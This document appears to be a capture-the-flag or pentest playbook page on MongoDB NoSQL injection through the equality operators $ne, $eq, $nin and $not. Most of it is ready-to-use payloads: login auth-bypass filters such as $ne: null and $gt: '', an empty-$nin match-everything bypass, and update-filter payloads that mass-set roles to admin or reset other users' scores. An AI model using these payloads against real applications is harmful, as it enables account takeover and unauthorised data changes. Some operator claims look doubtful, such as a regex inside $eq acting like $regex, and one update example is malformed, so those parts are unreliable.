# `$ne`/`$eq` deep — the equality operators

## `$ne` semantics — "not equal", including missing

`{"pass": {"$ne": null}}` matches docs where `pass` is anything but `null` —
including docs where `pass` DOES NOT EXIST. `$ne: null` is therefore the
"field exists AND non-null OR field absent" oracle. On a login that checks
`pass == result.pass`, a doc missing `pass` may break the compare or, worse,
`undefined == undefined` may pass in loose JS.

```json
{"user": {"$ne": null}}      — any doc where user is set-or-absent
{"pass": {"$ne": null}}      — any doc where pass is set-or-absent
{"user": {"$ne": "x"}}       — user != "x" OR user absent
{"user": {"$ne": 0}}         — user != 0 OR user absent
{"user": {"$ne": false}}     — user != false OR user absent
{"user": {"$ne": []}}        — user != [] OR user absent
{"user": {"$ne": {}}}        — user != {} OR user absent
{"user": {"$ne": "admin"}}   — NOT admin — bypass the admin-check
{"role": {"$ne": "admin"}}   — non-admin docs
```

## `$eq` semantics — the explicit equality

```json
{"user": {"$eq": "admin"}}    — same as {"user": "admin"}
{"user": {"$eq": {"$oid": "..."}}}
{"user": {"$eq": null}}       — user IS null OR absent — DANGEROUS
```

`$eq: null` matches docs where the field is `null` OR missing — the same
trap as `$ne` in reverse.

## The type-coercion — what `$eq` compares

```javascript
{"id": {"$eq": 1}}            — matches int 1, not "1" (BSON-typed)
{"id": {"$eq": "1"}}          — matches "1", not int 1
{"id": {"$eq": {"$oid": "..."}}} — ObjectId
{"id": {"$eq": true}}         — boolean true
{"id": {"$eq": [1, 2]}}       — array-exact OR array-contains — BOTH
{"id": {"$eq": {"$date": "..."}}} — date
{"id": {"$eq": /x/}}          — regex in $eq — works like $regex
```

`{"field": [1, 2]}` equality matches the exact array AND docs whose field
is an array containing the value — the array-match is bidirectional.

## The auth-bypass shapes

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
{"user": {"$ne": "nobody"}, "pass": {"$ne": null}}
{"user": {"$ne": ""}, "pass": {"$ne": ""}}
{"user": {"$ne": "guest"}, "pass": {"$ne": "guest"}}
{"user": {"$ne": null}, "pass": {"$ne": null}, "role": {"$ne": "user"}}
{"user": {"$ne": null}, "$or": [{"pass": {"$ne": null}}, {"pass": {"$eq": null}}]}
{"user": {"$ne": null}, "pass": {"$ne": null}, "isAdmin": true}
{"user": {"$ne": null}, "pass": {"$ne": null}, "flag": {"$exists": true}}
{"user": {"$regex": "^a"}, "pass": {"$ne": null}}
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
{"user": {"$gte": ""}, "pass": {"$gte": ""}}
```

## The first-doc trap — `findOne` vs `find`

`findOne({$ne: null})` returns the FIRST matching doc — on a users
collection the first doc is usually the admin/seed account, which is WHY
the `$ne` bypass so often lands on admin. On a `find` the whole list
comes back — the response-shape differs (array vs object) and is itself a
detection signal.

## The `$ne` falsifiers — when it can't bypass

- `bcrypt.compare(object, hash)` throws — `auth-bypass.md`
- `String(req.body.pass)` stringifies the object — `denied-conditions.md`
- schema `required: true` + cast — mongoose rejects — `mongo-specific.md`
- the app compares `doc.pass === req.body.pass` in JS — an object is never
  `===` a string, BUT `{"pass": {"$ne": null}}` as the FILTER returns a doc;
  the JS-compare then fails anyway — this is the subtle case: the filter
  bypass worked but the APP-level compare didn't. Look for a second oracle.

## `$ne` in update filters — the write-side

```json
{"_id": {"$ne": "mine"}, "$set": {"role": "admin"}}
{"user": {"$ne": "victim"}, "$set": {"score": 0}}
```

`updateMany` + `$ne` = mass-write — NEVER on a shared instance;
`update-injection.md` — test on solver-created objects only.

## `$nin` — the not-in list

```json
{"user": {"$nin": ["a", "b"]}}
{"role": {"$nin": ["admin", "mod"]}}
{"user": {"$nin": []}}          — NOT-in-empty = everything — total bypass
{"user": {"$nin": [null]}}
{"user": {"$nin": [""]}}
```

`$nin: []` matches EVERY doc — the empty-list bypass.

## `$not` — the negation wrapper

```json
{"pass": {"$not": {"$eq": null}}}
{"pass": {"$not": {"$regex": "^a"}}}
{"user": {"$not": {"$gt": "m"}}}
{"user": {"$not": {"$type": "null"}}}
{"user": {"$not": {"$exists": false}}}
{"pass": {"$not": {"$in": ["x", "y"]}}}
{"pass": {"$not": {"$size": 0}}}
```

`$not` wraps an operator-expression — `$not: {$eq: null}` ≈ `$ne: null`
but `$not` requires an operator — `$not: "x"` is INVALID.

## The null-semantics trap — absent vs null vs ""

```json
{"f": null}              — f is null OR absent
{"f": {"$eq": null}}     — same
{"f": {"$ne": null}}     — f present and non-null... NO — f absent OR non-null
{"f": {"$exists": true, "$ne": null}}  — f present AND non-null — the strict read
{"f": {"$exists": false}}              — f absent only
{"f": {"$type": "null"}}               — f present AND BSON-null
{"f": {"$type": 10}}                   — same, numeric type
```

The `{"f": null}` vs `{"f": {"$exists": false}}` distinction is the classic
trap — the first includes missing fields, the second is missing-only.

## `$eq`/$ne in nested paths

```json
{"profile.role": {"$ne": "user"}}
{"settings.admin": {"$ne": false}}
{"tokens.0.value": {"$ne": null}}
{"items.$": {"$ne": null}}
{"items.0": {"$ne": null}}
{"items.0.price": {"$ne": 0}}
{"flags.$[].value": {"$ne": null}}
```

The dot-path reaches into subdocs — `filter-bypass.md`.

## The array-element `$ne`

```json
{"tags": {"$ne": "hidden"}}         — docs whose tags lack "hidden"
{"tags": {"$ne": ["a", "b"]}}       — tags != exact array
{"items.price": {"$ne": 0}}         — a doc whose ANY item.price != 0
```

`{"tags": {"$ne": "x"}}` on an array means "x is not among the elements" —
the array-match again.

## Chained `$ne` — the double-negation

```json
{"user": {"$ne": {"$ne": null}}}    — INVALID — no nested $ne
{"user": {"$not": {"$ne": null}}}   — user IS null OR absent — inverse
{"user": {"$not": {"$not": {"$ne": null}}}}  — double-negation
```

`$not: {$not: ...}` is legal — the double-negation.

## The `$ne` + `$exists` — the precise-oracle

```json
{"flag": {"$exists": true, "$ne": null}}   — flag present & non-null
{"secret": {"$exists": true, "$ne": ""}}   — present & non-empty
{"role": {"$exists": true, "$ne": "user"}} — present & not "user"
```

The compound oracle — the field-shape probe.

## `$ne` timing — no direct timing

`$ne` gives no timing oracle — use `$where`/`$regex` for timing —
`operators-js.md`, `extraction.md`.
